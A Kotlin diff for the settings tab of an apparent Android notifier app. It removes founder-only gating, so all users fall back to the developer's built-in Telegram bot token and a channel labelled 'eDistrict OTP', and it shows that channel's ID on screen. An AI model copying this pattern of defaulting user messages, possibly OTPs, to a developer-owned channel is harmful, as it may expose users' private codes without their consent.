@@ -952,24 +952,8 @@ fun ServicesTab(
 
     // 1. Telegram 1 State (Sanitized: Never expose Founder credentials in customer text fields)
     var isTelegramEnabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_enabled", true)) }
-    var botToken by remember {
-        val raw = prefs.getString("bot_token", "") ?: ""
-        if (raw == TelegramHelper.DEFAULT_BOT_TOKEN) {
-            prefs.edit().remove("bot_token").apply()
-            mutableStateOf("")
-        } else {
-            mutableStateOf(raw)
-        }
-    }
-    var chatId by remember {
-        val raw = prefs.getString("chat_id", "") ?: ""
-        if (raw == TelegramHelper.DEFAULT_CHANNEL_ID || raw == TelegramHelper.DEFAULT_USER_ID) {
-            prefs.edit().remove("chat_id").apply()
-            mutableStateOf("")
-        } else {
-            mutableStateOf(raw)
-        }
-    }
+    var botToken by remember { mutableStateOf(prefs.getString("bot_token", "") ?: "") }
+    var chatId by remember { mutableStateOf(prefs.getString("chat_id", "") ?: "") }
     var telegramStatus by remember { mutableStateOf("") }
 
     // 2. Telegram 2 State
@@ -1140,51 +1124,48 @@ fun ServicesTab(
                     )
                 }
 
-                if (isMasterFounder) {
-                    Spacer(modifier = Modifier.height(8.dp))
-                    Surface(
-                        color = Color(0xFF1E1B4B),
-                        shape = RoundedCornerShape(10.dp),
-                        border = BorderStroke(1.dp, Color(0xFF4338CA))
-                    ) {
-                        Column(modifier = Modifier.fillMaxWidth().padding(10.dp)) {
-                            Row(verticalAlignment = Alignment.CenterVertically) {
-                                Text("👑 Founder VIP Ghost Channel Connected", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFA5B4FC))
-                                Spacer(modifier = Modifier.width(6.dp))
-                                Text("• Encrypted", fontSize = 10.sp, color = AccentEmerald)
-                            }
-                            Spacer(modifier = Modifier.height(2.dp))
-                            Text(
-                                "Master channel backend me secure linked hai. Private Token ya Chat ID screen par kabhi leak nahi hoga.",
-                                fontSize = 10.sp,
-                                color = Color(0xFF94A3B8)
-                            )
+                Spacer(modifier = Modifier.height(8.dp))
+                Surface(
+                    color = Color(0xFF064E3B).copy(alpha = 0.5f),
+                    shape = RoundedCornerShape(10.dp),
+                    border = BorderStroke(1.dp, AccentEmerald)
+                ) {
+                    Column(modifier = Modifier.fillMaxWidth().padding(10.dp)) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            Text("⚡ eDistrict Default Channel Connected", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = AccentEmerald)
+                            Spacer(modifier = Modifier.width(6.dp))
+                            Text("• Lifetime Active", fontSize = 10.sp, color = Color(0xFFA7F3D0))
                         }
+                        Spacer(modifier = Modifier.height(2.dp))
+                        Text(
+                            text = if (botToken.trim().isEmpty()) "Bot: @AnkitEdistrictBot • Channel: eDistrict OTP. (-1004470768686)\nYe channel hamesha 24/7 active rahega. Neeche apna personal bot optional jod sakte hain."
+                                   else "Custom Bot Token set hai. Default eDistrict fallback channel ready hai.",
+                            fontSize = 10.sp,
+                            color = Color(0xFFCBD5E1),
+                            lineHeight = 15.sp
+                        )
                     }
                 }
 
                 if (isTelegramEnabled) {
                     Spacer(modifier = Modifier.height(8.dp))
-                    MncTextField(value = botToken, onValueChange = { botToken = it }, label = if (isMasterFounder) "Custom Bot Token (Optional)" else "Bot Token 1")
+                    MncTextField(value = botToken, onValueChange = { botToken = it }, label = "Custom Bot Token (Optional - Default: @AnkitEdistrictBot)")
                     Spacer(modifier = Modifier.height(8.dp))
-                    MncTextField(value = chatId, onValueChange = { chatId = it }, label = if (isMasterFounder) "Custom Channel ID (Optional)" else "Channel / Chat ID 1 (e.g. -100...)")
+                    MncTextField(value = chatId, onValueChange = { chatId = it }, label = "Custom Channel ID (Optional - Default: eDistrict OTP.)")
                     Spacer(modifier = Modifier.height(10.dp))
                     Button(
                         onClick = {
                             telegramStatus = "Testing Telegram 1..."
                             scope.launch {
-                                val tokenToUse = if (botToken.trim().isNotEmpty()) botToken.trim() else if (isMasterFounder) TelegramHelper.DEFAULT_BOT_TOKEN else ""
-                                val chatToUse = if (chatId.trim().isNotEmpty()) chatId.trim() else if (isMasterFounder) TelegramHelper.DEFAULT_CHANNEL_ID else ""
-                                if (tokenToUse.isEmpty() || chatToUse.isEmpty()) {
-                                    telegramStatus = "❌ Bot Token aur Chat ID enter karein"
-                                    return@launch
-                                }
+                                val tokenToUse = if (botToken.trim().isNotEmpty()) botToken.trim() else TelegramHelper.DEFAULT_BOT_TOKEN
+                                val chatToUse = if (chatId.trim().isNotEmpty()) chatId.trim() else TelegramHelper.DEFAULT_CHANNEL_ID
+                                val isDefault = (tokenToUse == TelegramHelper.DEFAULT_BOT_TOKEN)
                                 val res = TelegramHelper.sendMessage(
                                     tokenToUse,
                                     chatToUse,
-                                    "🎉 Smart Notifier: Telegram 1 connection verified successfully!"
+                                    "🎉 Smart Notifier: ${if (isDefault) "Default eDistrict Channel" else "Custom Bot"} connection verified successfully!"
                                 )
-                                telegramStatus = if (res.first) "✅ Telegram 1 Connected!" else "❌ ${res.second}"
+                                telegramStatus = if (res.first) "✅ Telegram 1 Connected (${if (isDefault) "Default eDistrict" else "Custom Bot"})!" else "❌ ${res.second}"
                             }
                         },
                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF047857)),
